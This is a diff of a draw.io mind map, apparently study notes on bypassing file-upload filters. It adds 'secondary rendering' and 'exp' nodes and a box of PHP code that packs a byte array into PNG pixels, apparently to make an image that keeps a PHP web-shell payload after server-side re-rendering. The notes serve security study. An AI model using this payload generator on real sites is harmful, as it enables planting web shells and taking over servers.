@@ -1,6 +1,6 @@
-<mxfile host="app.diagrams.net" modified="2021-10-13T10:50:34.800Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" etag="5uaI5Uw6CQKlv5vmV6dD" version="15.5.0" type="github">
+<mxfile host="app.diagrams.net" modified="2021-10-13T12:12:21.302Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" etag="wo4hGaXCDstZ_J-zvkzG" version="15.5.0" type="github">
   <diagram id="LIGOupLPh29jA6jbOCXq" name="Page-1">
-    <mxGraphModel dx="1750" dy="603" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="1904" dy="703" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -9,6 +9,9 @@
         </mxCell>
         <mxCell id="968PWk8sjZi15OJH9R-X-14" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=24;" edge="1" parent="1" source="968PWk8sjZi15OJH9R-X-4" target="968PWk8sjZi15OJH9R-X-13">
           <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="968PWk8sjZi15OJH9R-X-52" value="&lt;div&gt;&amp;lt;?php&lt;/div&gt;&lt;div&gt;$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x66, 0x44, 0x50, 0x33);&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;$img = imagecreatetruecolor(32, 32);&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;for ($y = 0; $y &amp;lt; sizeof($p); $y += 3) {&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp;$r = $p[$y];&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp;$g = $p[$y+1];&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp;$b = $p[$y+2];&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp;$color = imagecolorallocate($img, $r, $g, $b);&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp;imagesetpixel($img, round($y / 3), 0, $color);&lt;/div&gt;&lt;div&gt;}&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;imagepng($img,&#39;./1.png&#39;);&lt;/div&gt;&lt;div&gt;?&amp;gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=24;align=left;" vertex="1" parent="1">
+          <mxGeometry x="950" y="580" width="620" height="750" as="geometry" />
         </mxCell>
         <mxCell id="968PWk8sjZi15OJH9R-X-16" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=24;" edge="1" parent="1" source="968PWk8sjZi15OJH9R-X-4" target="968PWk8sjZi15OJH9R-X-15">
           <mxGeometry relative="1" as="geometry" />
@@ -106,6 +109,26 @@
         </mxCell>
         <mxCell id="968PWk8sjZi15OJH9R-X-44" value="图片马（GIF89a文件头）+任意文件包含" style="whiteSpace=wrap;html=1;fontSize=24;" vertex="1" parent="1">
           <mxGeometry x="255" y="805" width="445" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="968PWk8sjZi15OJH9R-X-48" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=24;" edge="1" parent="1" source="968PWk8sjZi15OJH9R-X-46" target="968PWk8sjZi15OJH9R-X-47">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="968PWk8sjZi15OJH9R-X-50" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=24;" edge="1" parent="1" source="968PWk8sjZi15OJH9R-X-46" target="968PWk8sjZi15OJH9R-X-49">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="968PWk8sjZi15OJH9R-X-46" value="二次渲染" style="whiteSpace=wrap;html=1;fontSize=24;" vertex="1" parent="1">
+          <mxGeometry x="40" y="870" width="120" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="968PWk8sjZi15OJH9R-X-47" value="下载对比" style="whiteSpace=wrap;html=1;fontSize=24;" vertex="1" parent="1">
+          <mxGeometry x="255" y="870" width="105" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="968PWk8sjZi15OJH9R-X-51" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;fontSize=24;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="968PWk8sjZi15OJH9R-X-49" target="968PWk8sjZi15OJH9R-X-52">
+          <mxGeometry relative="1" as="geometry">
+            <mxPoint x="750" y="955" as="targetPoint" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="968PWk8sjZi15OJH9R-X-49" value="exp" style="whiteSpace=wrap;html=1;fontSize=24;" vertex="1" parent="1">
+          <mxGeometry x="255" y="940" width="90" height="30" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
